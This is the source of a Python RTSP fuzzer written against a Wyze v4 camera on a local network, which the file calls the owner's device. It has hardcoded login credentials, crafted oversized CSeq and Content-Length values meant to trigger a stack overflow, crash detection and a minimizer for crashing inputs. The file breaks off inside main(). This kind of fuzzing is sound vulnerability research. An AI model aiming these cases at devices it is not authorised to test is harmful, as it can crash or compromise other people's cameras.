#!/usr/bin/env python3
"""Bounded RTSP fuzzer for the owner's Wyze v4 (192.168.4.23:554).

No third-party dependencies. Keeps at most --jobs (<=4) concurrent clients
because the camera drops more than ~5 per IP. Performs Digest auth against
realm Wyze_Cam. Detects iCamera death by (a) the established RTSP port going
away and (b) a fresh authenticated OPTIONS failing on consecutive probes; a
declared crash is minimized with a bounded delta-debugger before the run stops.

Every case, its seed, request bytes, and result are appended to
docs/exploit/fuzz-log.md.

Usage:
    tools/rtsp_fuzz.py --batch 1                 # 500-case targeted batch
    tools/rtsp_fuzz.py --batch 2 --seed 0x1234
    tools/rtsp_fuzz.py --list-classes
    tools/rtsp_fuzz.py --dry-run --batch 1       # build cases, send nothing
    tools/rtsp_fuzz.py --minimize <case.json>    # minimize one recorded case

Exit codes: 0 = batch clean, 2 = crash found, 3 = camera unreachable at start,
4 = usage error.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import json
import os
import random
import re
import socket
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone

HOST = "192.168.4.23"
PORT = 554
USER = "fss"
PASSWORD = "fsspass123"
REALM_EXPECTED = "Wyze_Cam"
LOG_DEFAULT = "docs/exploit/fuzz-log.md"

CONNECT_TIMEOUT = 3.0
READ_TIMEOUT = 1.5
MAX_JOBS = 4
MAX_BATCH = 500
MAX_REPLY = 4096
CRASH_PROBES = 3
CRASH_PROBE_GAP = 2.5
RECOVERY_TIMEOUT = 120.0


# --------------------------------------------------------------------------
# Digest auth
# --------------------------------------------------------------------------

def md5_hex(data: bytes) -> str:
    return hashlib.md5(data).hexdigest()


def parse_challenge(header: bytes) -> dict[str, str]:
    text = header.decode("latin-1", "replace")
    if text.lower().startswith("digest "):
        text = text[7:]
    out: dict[str, str] = {}
    for m in re.finditer(r'([A-Za-z0-9_-]+)\s*=\s*("([^"]*)"|[^,\s]+)', text):
        out[m.group(1).lower()] = m.group(3) if m.group(3) is not None else m.group(2)
    return out


class Digest:
    def __init__(self, challenge: dict[str, str], method: str, uri: str) -> None:
        self.realm = challenge.get("realm", REALM_EXPECTED)
        self.nonce = challenge.get("nonce", "")
        self.qop = challenge.get("qop", "").split(",")[0].strip()
        self.opaque = challenge.get("opaque")
        self.algorithm = challenge.get("algorithm", "MD5")
        self.nc = 1
        self.cnonce = base64.b16encode(os.urandom(8)).decode().lower()
        self.ha1 = md5_hex(f"{USER}:{self.realm}:{PASSWORD}".encode())
        self.ha2 = md5_hex(f"{method}:{uri}".encode())

    def header(self, method: str, uri: str, cseq: int) -> bytes:
        if self.algorithm.upper() != "MD5":
            # The camera only offers MD5; keep the field for completeness.
            pass
        if self.qop in ("auth", "auth-int"):
            resp = md5_hex(
                f"{self.ha1}:{self.nonce}:{self.nc:08x}:{self.cnonce}:{self.qop}:{self.ha2}".encode()
            )
            extra = f', qop={self.qop}, nc={self.nc:08x}, cnonce="{self.cnonce}"'
        else:
            resp = md5_hex(f"{self.ha1}:{self.nonce}:{self.ha2}".encode())
            extra = ""
        opaque = f', opaque="{self.opaque}"' if self.opaque else ""
        return (
            f'Authorization: Digest username="{USER}", realm="{self.realm}", '
            f'nonce="{self.nonce}", uri="{uri}", response="{resp}", '
            f'algorithm={self.algorithm}{extra}{opaque}\r\n'
        ).encode()


def xml_quote(s: str) -> str:
    return s.replace('"', '\\"')


# --------------------------------------------------------------------------
# Wire helpers
# --------------------------------------------------------------------------

@dataclass
class Reply:
    status: str = "NO-REPLY"
    closed: bool = False
    bytes: int = 0
    body: bytes = b""


def connect(host: str, port: int, timeout: float = CONNECT_TIMEOUT) -> socket.socket:
    """connect(2) with retries.

    This host's Wi-Fi periodically answers connect() with EHOSTUNREACH/
    ENETUNREACH while the connected route is re-probing; nc rides this out by
    retrying, and so must we. Only path-level errors are retried -- a RST is
    returned to the caller.
    """
    iface = os.environ.get("RTSP_FUZZ_IF")
    last: OSError | None = None
    for attempt in range(12):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if iface:
            # macOS IP_BOUND_IF: force this interface even when its connected
            # route lives in an ifscope table.
            idx = socket.if_nametoindex(iface)
            s.setsockopt(socket.IPPROTO_IP, 25, idx.to_bytes(4, "little"))
        s.settimeout(timeout)
        try:
            s.connect((host, port))
            s.settimeout(READ_TIMEOUT)
            return s
        except ConnectionRefusedError:
            s.close()
            raise
        except OSError as exc:
            s.close()
            last = exc
            if exc.errno not in (65, 51):  # EHOSTUNREACH, ENETUNREACH
                raise
            time.sleep(0.4 + 0.1 * attempt)
    raise last if last else OSError("connect failed")


def read_reply(s: socket.socket, budget: float = READ_TIMEOUT) -> Reply:
    """Read until short timeout/EOF, capped. Never raises for normal errors."""
    deadline = time.monotonic() + budget
    buf = bytearray()
    while len(buf) < MAX_REPLY and time.monotonic() < deadline:
        try:
            chunk = s.recv(min(1024, MAX_REPLY - len(buf)))
        except socket.timeout:
            break
        except OSError:
            return Reply("ERR", True, len(buf), bytes(buf))
        if not chunk:
            return Reply("EOF", True, len(buf), bytes(buf))
        buf += chunk
        if b"\r\n\r\n" in buf:
            break
    first = bytes(buf).split(b"\r\n", 1)[0].decode("latin-1", "replace")
    return Reply(first[:200] or "NO-REPLY", False, len(buf), bytes(buf))


def challenge_from(reply: Reply) -> dict[str, str] | None:
    for line in reply.body.split(b"\r\n"):
        if line.lower().startswith(b"www-authenticate:"):
            return parse_challenge(line.split(b":", 1)[1])
    return None


def authenticated_exchange(
    s: socket.socket, request: bytes, method: str, uri: str, cseq: int
) -> Reply:
    """Send `request`; on 401 retry once with an Authorization header."""
    s.sendall(request)
    reply = read_reply(s)
    if reply.status.startswith("RTSP/1.0 401"):
        challenge = challenge_from(reply)
        if challenge is None:
            return reply
        auth = Digest(challenge, method, uri)
        auth_line = auth.header(method, uri, cseq)
        cut = request.find(b"\r\n")
        retry = request[: cut + 2] + auth_line + request[cut + 2 :]
        s.sendall(retry)
        return read_reply(s)
    return reply


# --------------------------------------------------------------------------
# Liveness / crash detection
# --------------------------------------------------------------------------

def options_request(cseq: int = 1, uri: str = "*") -> bytes:
    return (
        f"OPTIONS {uri} RTSP/1.0\r\nCSeq: {cseq}\r\nUser-Agent: fss-rtsp-fuzz\r\n\r\n"
    ).encode()


def probe_alive(host: str, port: int, timeout: float = CONNECT_TIMEOUT) -> tuple[bool, str]:
    """One fresh authenticated OPTIONS. True only on a 200.

    The failure reason is classified: `refused` (RST from a live IP stack with
    no listener) is the only conclusive crash signal; `unreach`/`timeout`/
    `reset` can also come from this host's flaky Wi-Fi and must not declare a
    crash on their own.
    """
    try:
        s = connect(host, port, timeout)
    except ConnectionRefusedError:
        return False, "refused"
    except socket.timeout:
        return False, "timeout"
    except OSError as exc:
        if exc.errno in (65, 51):  # EHOSTUNREACH, ENETUNREACH on darwin
            return False, "unreach"
        return False, f"connect:{exc.__class__.__name__}"
    try:
        reply = authenticated_exchange(s, options_request(), "OPTIONS", "*", 1)
        return reply.status.startswith("RTSP/1.0 200"), reply.status
    except ConnectionResetError:
        return False, "reset"
    except socket.timeout:
        return False, "timeout"
    except OSError as exc:
        return False, f"io:{exc.__class__.__name__}"
    finally:
        s.close()


@dataclass
class Verdict:
    crashed: bool
    detail: str
    recovered: bool = False


class Canary:
    """One long-lived authenticated OPTIONS connection.

    The camera drops more than ~5 clients per IP, so new connections are the
    scarce resource. The canary is the *only* always-open socket: it is cheap
    to poll and it dies with iCamera, which is exactly the crash signal.
    """

    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port
        self.sock: socket.socket | None = None
        self.cseq = 1
        self.last_error = "none"

    def ensure(self, attempts: int = 8, gap: float = 2.0) -> tuple[bool, str]:
        if self.sock is not None:
            ok, why = self.check()
            if ok:
                return True, why
            self.close()
        why = "none"
        for i in range(attempts):
            if self.open():
                return True, "ok"
            why = self.last_error
            if i + 1 < attempts:
                time.sleep(gap)
        return False, why

    def open(self) -> bool:
        try:
            s = connect(self.host, self.port)
        except Exception as exc:  # noqa: BLE001 - classified below
            self.last_error = classify_oserror(exc)
            return False
        s.settimeout(READ_TIMEOUT)
        self.sock = s
        ok, why = self.check()
        if not ok:
            self.close()
            self.last_error = why
        return ok

    def check(self) -> tuple[bool, str]:
        if self.sock is None:
            return False, "closed"
        self.cseq += 1
        try:
            reply = authenticated_exchange(
                self.sock, options_request(self.cseq), "OPTIONS", "*", self.cseq
            )
        except ConnectionResetError:
            return False, "reset"
        except socket.timeout:
            return False, "timeout"
        except OSError as exc:
            return False, classify_oserror(exc)
        return reply.status.startswith("RTSP/1.0 200"), reply.status

    def close(self) -> None:
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None


def classify_oserror(exc: BaseException) -> str:
    if isinstance(exc, ConnectionRefusedError):
        return "refused"
    if isinstance(exc, socket.timeout):
        return "timeout"
    if isinstance(exc, ConnectionResetError):
        return "reset"
    errno = getattr(exc, "errno", None)
    if errno in (65, 51):  # EHOSTUNREACH, ENETUNREACH on darwin
        return "unreach"
    return f"connect:{exc.__class__.__name__}"


def confirm_crash(host: str, port: int, canary: Canary) -> Verdict:
    """Called only after the canary died. Reconnect with a fresh socket."""
    detail: list[str] = []
    conclusive = False
    for attempt in range(CRASH_PROBES):
        if canary.ensure(attempts=1, gap=0.0)[0]:
            return Verdict(False, "canary-recovered")
        why = canary.last_error
        detail.append(why)
        if why == "refused":
            conclusive = True
        if attempt + 1 < CRASH_PROBES:
            time.sleep(CRASH_PROBE_GAP)
    if not conclusive and detail and all(d == "unreach" for d in detail):
        return Verdict(False, "link-flap:" + "|".join(detail))
    deadline = time.monotonic() + RECOVERY_TIMEOUT
    while time.monotonic() < deadline:
        time.sleep(2.0)
        if canary.ensure(attempts=1, gap=0.0)[0]:
            return Verdict(True, "crashed-and-recovered:" + "|".join(detail), True)
    return Verdict(True, "crashed-no-recovery:" + "|".join(detail), False)


# --------------------------------------------------------------------------
# Case model and mutation catalogue
# --------------------------------------------------------------------------

@dataclass
class Case:
    id: str
    cls: str
    note: str
    frames: list[bytes]
    auth_first: bool = True
    settle: float = 0.0
    gap: float = 0.0
    reply_after: bool = True


@dataclass
class Result:
    case: Case
    reply: Reply
    outcome: str
    verdict: Verdict | None = None
    seed: int = 0


def valid_methods() -> list[str]:
    return ["OPTIONS", "DESCRIBE", "SETUP", "PLAY", "TEARDOWN", "GET_PARAMETER"]


def base_uri() -> str:
    return f"rtsp://{HOST}:{PORT}/stream0"


def hdr(name: str, value: str) -> bytes:
    return f"{name}: {value}\r\n".encode()


def request(
    method: str,
    uri: str,
    version: str = "RTSP/1.0",
    cseq: str | None = "1",
    headers: list[tuple[str, str]] | None = None,
    body: bytes = b"",
    omit_cseq: bool = False,
) -> bytes:
    out = bytearray(f"{method} {uri} {version}\r\n".encode())
    if cseq is not None and not omit_cseq:
        out += hdr("CSeq", cseq)
    names = {k.lower() for k, _ in headers or []}
    for k, v in headers or []:
        out += hdr(k, v)
    if body and "content-length" not in names:
        out += hdr("Content-Length", str(len(body)))
    out += b"\r\n"
    out += body
    return bytes(out)


def interleaved(channel: int, payload: bytes) -> bytes:
    return b"$" + bytes([channel & 0xFF]) + len(payload).to_bytes(2, "big") + payload


def build_cases() -> list[Case]:
    """Ordered catalogue; earlier classes hit the highest-value hypotheses."""
    e = base_uri()
    cases: list[Case] = []
    n = 0

    def add(cls: str, note: str, frames: list[bytes], **kw) -> None:
        nonlocal n
        n += 1
        cases.append(Case(f"{n:04d}", cls, note, frames, **kw))

    def one(cls: str, note: str, data: bytes, **kw) -> None:
        add(cls, note, [data], **kw)

    # --- 1. Prime suspect: sscanf/alloca of unbounded numeric values ------
    # Wyze's parser memcpy()s CSeq/Content-Length values into a ~80-byte stack
    # slot and only then sscanf()s them; anything past that is a stack smash.
    for length in (64, 80, 96, 128, 256, 512, 1024, 2048, 4096, 6000, 7000, 8000, 8100):
        one(
            "cseq-len",
            f"CSeq value {length} x '9'",
            request("OPTIONS", e, cseq="9" * length),
        )
        if length <= 8100 - 40:
            one(
                "cl-len",
                f"Content-Length value {length} x '9'",
                request("OPTIONS", e, headers=[("Content-Length", "9" * length)]),
            )
    # Same shapes with NUL-safe random and mixed content.
    for length in (512, 2048, 8000):
        one("cseq-mixed", f"CSeq value {length} mixed",
            request("OPTIONS", e, cseq=("1a2b3c4d" * (length // 8 + 1))[:length]))
        one("cl-mixed", f"Content-Length value {length} mixed",
            request("OPTIONS", e, headers=[("Content-Length", ("0" * length))]))
    # Long version digits, both major and minor.
    for length in (16, 128, 1024, 4000, 8000):
        one("version-len", f"RTSP version major {length} digits",
            f"OPTIONS {e} RTSP/{'9' * length}.0\r\nCSeq: 1\r\n\r\n".encode())
    for length in (16, 1024, 8000):
        one("version-len", f"RTSP version minor {length} digits",
            f"OPTIONS {e} RTSP/1.{'9' * length}\r\nCSeq: 1\r\n\r\n".encode())
    for length in (64, 1024, 4000):
        one("cseq-len", f"CSeq value {length} x ' ' (then 1)",
            request("OPTIONS", e, cseq=" " * length + "1"))

    # --- 2. Request line: method / URI shapes ----------------------------
    for m in ("OPTIONS", "DESCRIBE", "SETUP", "PLAY", "TEARDOWN", "GET_PARAMETER"):
        one("method", f"valid method {m}", request(m, e, headers=[("Transport", "RTP/AVP/TCP;unicast;interleaved=0-1")]))
    for m in ("XCUSTOM", "OPTIONS0", "optIONS", "OPTIONSX", "OPTIONS_", "DE SCRIBE"):
        one("method", f"method {m!r}", request(m, e))
    long_method = "M" * 8000
    one("method-len", "method 8000 chars", f"{long_method} {e} RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode())
    for length in (1, 8, 64, 512, 1024, 4096, 7000, 8100):
        one("uri-len", f"URI {length} x 'a'", f"OPTIONS {'a' * length} RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode())
    for uri in ("*", "/", "stream0", f"{e}?x=1", f"{e}/extra", "rtsp://", "rtsp:///", "//host/stream0",
                "rtsp://[::1]:554/stream0", f"{e}#frag", f"{e}%00", "rtsp://" + "H" * 100 + "/"):
        one("uri-shape", f"URI {uri[:40]!r}", f"OPTIONS {uri} RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode())
    one("uri-shape", "URI with space", f"OPTIONS {e}/a b RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode())
    one("uri-shape", "URI with CRLF preamble", f"OPTIONS {e}\r\n\r\nRTSP/1.0\r\nCSeq: 1\r\n\r\n".encode())

    # --- 3. Header names / values / duplicates / counts ------------------
    for name in ("X", "X-A", "CSeq", "cseq", "CSEQ", "X-" + "a" * 64, "X-" + "a" * 800):
        one("header-name", f"name {name[:24]!r}", request("OPTIONS", e, headers=[(name, "1")]))
    for name in ("", "-", "X_", "X Y", " X", "X:"):
        one("header-name", f"malformed name {name!r}", f"OPTIONS {e} RTSP/1.0\r\nCSeq: 1\r\n{name}: 1\r\n\r\n".encode())
    for value in ("", " ", "  x", "x  ", "a" * 256, "a" * 1024, "a" * 2048, "a" * 4000, "a" * 8000):
        one("header-value", f"X-Fuzz value {len(value)} bytes", request("OPTIONS", e, headers=[("X-Fuzz", value)]))
    for value in ("\x00", "a\x00b", "\t", "a\tb", "a\rb", "a\nb", "\x01\x02\x03", "é", "a" * 100 + "\x7f"):
        one("header-value", f"X-Fuzz value {value!r}"[:80], request("OPTIONS", e, headers=[("X-Fuzz", value)]))
    one("header-dup", "duplicate X-Fuzz", request("OPTIONS", e, headers=[("X-Fuzz", "1"), ("X-Fuzz", "2")]))
    one("header-dup", "duplicate CSeq", request("OPTIONS", e, headers=[("CSeq", "2")]))
    one("header-dup", "CSeq 1 then 2", request("OPTIONS", e, cseq="1", headers=[("CSeq", "2")]))
    for count in (28, 30, 31, 32, 33, 34, 40, 64):
        hs = [("X-H%02d" % i, "v") for i in range(count)]
        one("header-count", f"{count} extra headers", request("OPTIONS", e, headers=hs))
    for count in (8, 36):
        hs = [("X-H%02d" % i, "a" * 190) for i in range(count)]
        one("header-count", f"{count} headers x 190B values", request("OPTIONS", e, headers=hs))
    one("header-count", "40 headers x 170B values (cap probe)",
        request("OPTIONS", e, headers=[(f"X-H{i}", "v" * 170) for i in range(40)]))
    one("header-count", "oversize: 50 headers x 200B (stall)",
        request("OPTIONS", e, headers=[(f"X-H{i}", "v" * 200) for i in range(50)]), settle=1.0)
    one("header-missing-colon", "header without colon", f"OPTIONS {e} RTSP/1.0\r\nCSeq: 1\r\nXNoColon\r\n\r\n".encode())
    one("header-space-colon", "space before colon", f"OPTIONS {e} RTSP/1.0\r\nCSeq : 1\r\n\r\n".encode())
    one("header-leading-space", "obs-fold header",
        f"OPTIONS {e} RTSP/1.0\r\nCSeq: 1\r\nX-Fold: a\r\n folded\r\n\r\n".encode())
    one("header-lf-only", "LF-only terminator", f"OPTIONS {e} RTSP/1.0\nCSeq: 1\n\n".encode())
    one("header-lf-only", "LF-only header line", f"OPTIONS {e} RTSP/1.0\r\nCSeq: 1\r\nX: 1\n\r\n".encode())

    # --- 4. CSeq / Content-Length semantics ------------------------------
    for value in ("", "-1", "+1", "0", "4294967295", "4294967296", "9999999999999999999999", " 1", "1 ", "1x", "x1", "0x10", "1,2"):
        one("cseq-value", f"CSeq {value!r}", request("OPTIONS", e, cseq=value))
    one("cseq-missing", "no CSeq", request("OPTIONS", e, omit_cseq=True))
    one("cseq-missing", "CSeq empty value", request("OPTIONS", e, cseq=""))
    for value in ("-1", "0", "1", "4294967296", "18446744073709551615", "9999999999999999999999", " 1", "1x"):
        one("cl-value", f"Content-Length {value!r}", request("OPTIONS", e, headers=[("Content-Length", value)]))
    one("cl-body", "CL 4 + body", request("OPTIONS", e, headers=[("Content-Length", "4")], body=b"abcd"))
    one("cl-body", "CL 0 + body bytes", request("OPTIONS", e, headers=[("Content-Length", "0")], body=b"abcd"))
    one("cl-body", "CL 100 + 4-byte body", request("OPTIONS", e, headers=[("Content-Length", "100")], body=b"abcd"))
    one("cl-body", "CL 4 + 100-byte body", request("OPTIONS", e, headers=[("Content-Length", "4")], body=b"a" * 100))

    # --- 5. SETUP transport params ---------------------------------------
    setup_uri = f"rtsp://{HOST}:{PORT}/stream0/track1"
    transports = [
        "RTP/AVP/TCP;unicast;interleaved=0-1",
        "RTP/AVP/TCP;unicast;interleaved=0",
        "RTP/AVP/TCP;unicast;interleaved=5",
        "RTP/AVP/TCP;unicast",
        "RTP/AVP;unicast;client_port=5000-5001",
        "RTP/AVP;unicast;client_port=5000",
        "RTP/AVP;unicast;client_port=",
        "RTP/AVP;unicast;client_port=-1",
        "RTP/AVP;unicast",
        "RTP/AVP/TCP;unicast;interleaved=0-1;interleaved=2-3",
        "RTP/AVP/TCP;unicast;interleaved=0-1;x=" + "a" * 1000,
        "RTP/AVP/TCP;unicast;interleaved=0-1;" * 40,
        "RTP/AVP/TCP;unicast;interleaved=00-01",
        "RTP/AVP/TCP;unicast;interleaved=0-1;mode=play",
        "RTP/AVP/TCP;unicast;interleaved=255-256",
        "RTP/AVP/TCP;unicast;interleaved=65535-65535",
        "RTP/AVP/TCP;unicast;interleaved=0-1;dst=1.2.3.4;ttl=1",
        "RTP/AVP/UDP;unicast;client_port=0-1",
        "RTP/AVP/TCP",
        "",
    ]
    for t in transports:
        one("transport", f"Transport {t[:40]!r}", request("SETUP", setup_uri, headers=[("Transport", t)]))
    one("transport-missing", "SETUP without Transport", request("SETUP", setup_uri))
    one("transport-len", "Transport 8000 bytes", request("SETUP", setup_uri, headers=[("Transport", "a" * 8000)]))

    # --- 6. Session values ------------------------------------------------
    for sess in ("", "0", "1", "-1", "a" * 64, "a" * 1024, "a" * 4000, "1234567890abcdef", "0x10", " "):
        one("session", f"PLAY Session {sess[:16]!r}", request("PLAY", e, headers=[("Session", sess), ("Range", "npt=0.000-")]))
    one("session", "two Session headers", request("PLAY", e, headers=[("Session", "1"), ("Session", "2")]))
    one("session", "TEARDOWN bogus Session", request("TEARDOWN", e, headers=[("Session", "bogus")]))

    # --- 7. Interleaved frames -------------------------------------------
    for ch in (0, 1, 255):
        one("interleaved", f"leading $ frame ch={ch} len=8",
            interleaved(ch, b"ABCDEFGH") + request("OPTIONS", e), auth_first=False)
    one("interleaved", "leading $ frame len=0", interleaved(0, b"") + request("OPTIONS", e), auth_first=False)
    one("interleaved", "three leading $ frames",
        b"".join(interleaved(0, b"x" * 16) for _ in range(3)) + request("OPTIONS", e), auth_first=False)
    for cut in (1, 2, 3):
        one("interleaved", f"truncated $ header {cut} bytes", b"$" + b"\x00" * (cut - 1))
        one("interleaved", f"truncated $ header {cut} bytes + OPTIONS",
            b"$" + b"\x00" * (cut - 1) + request("OPTIONS", e), auth_first=False)
    one("interleaved", "$ declares 65535 but sends 4", b"$\x00\xff\xffabcd" + request("OPTIONS", e), auth_first=False)
    one("interleaved", "$ declares 4 same frame", b"$\x00\x00\x04abcd" + request("OPTIONS", e), auth_first=False)
    one("interleaved", "$ declares 0 after OPTIONS", request("OPTIONS", e) + b"$\x00\x00\x00", auth_first=False)

    # --- 8. Pipelining and chunking --------------------------------------
    one("pipeline", "two OPTIONS", request("OPTIONS", e, cseq="1") + request("OPTIONS", e, cseq="2"), auth_first=False)
    one("pipeline", "four OPTIONS", b"".join(request("OPTIONS", e, cseq=str(i)) for i in range(2, 6)), auth_first=False)
    one("pipeline", "OPTIONS + partial OPTIONS", request("OPTIONS", e, cseq="1") + b"OPTIONS " + e.encode() + b" RT", auth_first=False)
    one("pipeline", "eight tiny OPTIONS", b"".join(request("OPTIONS", "*", cseq=str(i)) for i in range(1, 9)), auth_first=False)
    one("pipeline", "interleaved between two OPTIONS",
        request("OPTIONS", e, cseq="1") + interleaved(0, b"z" * 32) + request("OPTIONS", e, cseq="2"), auth_first=False)
    one("pipeline-len", "70 OPTIONS", b"".join(request("OPTIONS", "*", cseq=str(i)) for i in range(1, 71)), auth_first=False)
    full = request("OPTIONS", e)
    for split in (1, 7, 18, len(full) // 2, len(full) - 2):
        one("chunk", f"OPTIONS split at {split}", [full[:split], full[split:]], gap=0.15)
    one("chunk", "headers split, CSeq after delay",
        [f"OPTIONS {e} RTSP/1.0\r\n".encode(), b"CSeq: 1\r\n\r\n"], gap=0.3)
    one("chunk", "one header per write",
        [f"OPTIONS {e} RTSP/1.0\r\n".encode(), b"CSeq: 1\r\n", b"User-Agent: x\r\n", b"\r\n"], gap=0.1)

    # --- 9. Auth shapes ---------------------------------------------------
    one("auth", "OPTIONS without auth header (401 expected)",
        f"OPTIONS {e} RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode(), auth_first=False)
    one("auth", "wrong user: fssx",
        f"OPTIONS {e} RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Digest username=\"fssx\", realm=\"Wyze_Cam\", "
        f"nonce=\"deadbeef\", uri=\"{e}\", response=\"00000000000000000000000000000000\"\r\n\r\n".encode(),
        auth_first=False)
    one("auth", "empty nonce",
        f"OPTIONS {e} RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Digest username=\"fss\", realm=\"Wyze_Cam\", "
        f"nonce=\"\", uri=\"{e}\", response=\"00000000000000000000000000000000\"\r\n\r\n".encode(),
        auth_first=False)
    one("auth", "8000-byte nonce",
        f"OPTIONS {e} RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Digest username=\"fss\", realm=\"Wyze_Cam\", "
        f"nonce=\"{'a' * 4000}\", uri=\"{e}\", response=\"00000000000000000000000000000000\"\r\n\r\n".encode(),
        auth_first=False)
    one("auth", "8000-byte response",
        f"OPTIONS {e} RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Digest username=\"fss\", realm=\"Wyze_Cam\", "
        f"nonce=\"x\", uri=\"{e}\", response=\"{'0' * 8000}\"\r\n\r\n".encode(), auth_first=False)
    one("auth", "Basic scheme with long token",
        f"OPTIONS {e} RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {'A' * 4000}\r\n\r\n".encode(), auth_first=False)
    one("auth", "two Authorization headers",
        request("OPTIONS", e, headers=[("Authorization", "Basic eA=="), ("Authorization", "Basic eQ==")]),
        auth_first=False)

    return cases


# --------------------------------------------------------------------------
# Runner
# --------------------------------------------------------------------------

def classify(reply: Reply) -> str:
    if reply.status == "EOF":
        return "closed"
    if reply.status == "ERR":
        return "error"
    if reply.status == "NO-REPLY":
        return "no-reply"
    m = re.match(r"RTSP/\d\.\d (\d{3})", reply.status)
    if m:
        code = int(m.group(1))
        if 200 <= code < 300:
            return "2xx"
        if 400 <= code < 500:
            return "4xx"
        if 500 <= code < 600:
            return "5xx"
    return "odd"


def run_case(case: Case, host: str, port: int, canary: Canary, pace: float = 0.3) -> Result:
    for attempt in range(4):
        ok, why = canary.ensure(attempts=1, gap=0.0)
        if not ok:
            time.sleep(2.0)
            continue
        res = _run_case_once(case, host, port)
        time.sleep(pace)
        alive, _ = canary.check()
        if alive:
            return res
        v = confirm_crash(host, port, canary)
        if v.crashed:
            res.verdict = v
            return res
        # Not a crash: the link or the canary dropped. Retry the case once the
        # canary is back.
        res.verdict = None
        if attempt == 3:
            return res
    return res


def _run_case_once(case: Case, host: str, port: int) -> Result:
    reply = Reply()
    try:
        s = connect(host, port)
    except OSError as exc:
        return Result(case, Reply(f"connect:{exc.__class__.__name__}"), "connect-fail")

    try:
        if case.auth_first:
            first = case.frames[0]
            method = first.split(b" ", 1)[0].decode("latin-1", "replace")
            uri = first.split(b" ")[1].decode("latin-1", "replace") if b" " in first else "*"
            reply = authenticated_exchange(s, first, method, uri, 1)
            for frame in case.frames[1:]:
                if case.gap:
                    time.sleep(case.gap)
                s.sendall(frame)
        else:
            for i, frame in enumerate(case.frames):
                if i and case.gap:
                    time.sleep(case.gap)
                s.sendall(frame)
            reply = read_reply(s)
        if case.settle:
            time.sleep(case.settle)
        if case.auth_first and len(case.frames) > 1:
            extra = read_reply(s, 0.5)
            if extra.status not in ("NO-REPLY",):
                reply = extra
    except OSError as exc:
        reply = Reply(f"io:{exc.__class__.__name__}", True)
    finally:
        s.close()

    return Result(case, reply, classify(reply))


def esc(data: bytes, limit: int = 240) -> str:
    out = []
    for b in data[:limit]:
        c = chr(b)
        if c == "\\":
            out.append("\\\\")
        elif c == "\r":
            out.append("\\r")
        elif c == "\n":
            out.append("\\n")
        elif 32 <= b < 127:
            out.append(c)
        else:
            out.append(f"\\x{b:02x}")
    if len(data) > limit:
        out.append(f"...(+{len(data) - limit}B)")
    return "".join(out)


def sha(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()[:16]


# --------------------------------------------------------------------------
# Minimisation
# --------------------------------------------------------------------------

def crashing(data: bytes, host: str, port: int) -> tuple[bool, bool]:
    """Send raw bytes; return (crashed, recovered)."""
    canary = Canary(host, port)
    if not canary.ensure(attempts=6, gap=2.0)[0]:
        return False, True
    try:
        s = connect(host, port)
        s.sendall(data)
        read_reply(s, 1.0)
        s.close()
    except OSError:
        pass
    alive, _ = canary.check()
    if alive:
        canary.close()
        return False, True
    v = confirm_crash(host, port, canary)
    canary.close()
    return v.crashed, v.recovered


def minimize(data: bytes, host: str, port: int) -> bytes:
    """Bounded delta debugger: drop header lines, then shrink values."""
    # Split into header-ish lines, keep request line + CSeq/Authorization-tail.
    lines = data.split(b"\r\n")
    changed = True
    rounds = 0
    while changed and rounds < 24:
        changed = False
        rounds += 1
        i = 1
        while i < len(lines) - 1 and rounds < 60:
            trial = b"\r\n".join(lines[:i] + lines[i + 1 :])
            crashed, recovered = crashing(trial, host, port)
            rounds += 1
            if crashed:
                lines = lines[:i] + lines[i + 1 :]
                changed = True
            else:
                i += 1
    best = b"\r\n".join(lines)
    # Then halve remaining long tokens.
    for _ in range(12):
        token = re.search(rb"[A-Za-z0-9]{64,}", best)
        if not token:
            break
        lo, hi = len(token.group()) // 2, len(token.group())
        crashed, _ = crashing(best[: token.start()] + b"9" * lo + best[token.end() :], host, port)
        if crashed:
            best = best[: token.start()] + b"9" * lo + best[token.end() :]
        else:
            break
    return best


# --------------------------------------------------------------------------
# Log
# --------------------------------------------------------------------------

class Log:
    def __init__(self, path: str, seed: int, batch: str) -> None:
        self.path = path
        new = not os.path.exists(path)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        self.fh = open(path, "a", encoding="utf-8")
        self.seed = seed
        if new:
            self.fh.write(
                "# RTSP fuzz log — Wyze v4 192.168.4.23:554\n\n"
                "Digest realm `Wyze_Cam`, user `fss`. ≤4 concurrent clients, "
                "bounded batches (≤500), stop on first crash. "
                "Result classes: 2xx/4xx/5xx/odd = alive, closed = FIN, "
                "no-reply = timeout, error = socket error, CRASH = port dead on "
                f"{CRASH_PROBES} consecutive probes.\n\n"
                "| time (UTC) | case | class | seed | mutation | outcome | reply | bytes | sha256/16 |\n"
                "|---|---|---|---|---|---|---|---|---|\n"
            )
        self.fh.write(f"\n### batch {batch} start {now_iso()} seed {seed:#x}\n\n")

    def write(self, res: Result) -> None:
        raw = b"".join(res.case.frames)
        detail = "<br>".join(esc(f) for f in res.case.frames)
        self.fh.write(
            f"| {now_iso()} | {res.case.id} | {res.case.cls} | {res.seed:#x} | "
            f"{res.case.note.replace('|', '\\|')} | "
            f"{'CRASH' if res.verdict and res.verdict.crashed else res.outcome} | "
            f"{esc(res.reply.status.encode(), 80)} | {len(raw)} | "
            f"{sha(raw)} `{detail[:400]}` |\n"
        )
        self.fh.flush()

    def note(self, text: str) -> None:
        self.fh.write(f"\n{text}\n")
        self.fh.flush()

    def close(self) -> None:
        self.fh.close()


def now_iso() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


# --------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------

def main(argv: list[str]) -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default=HOST)
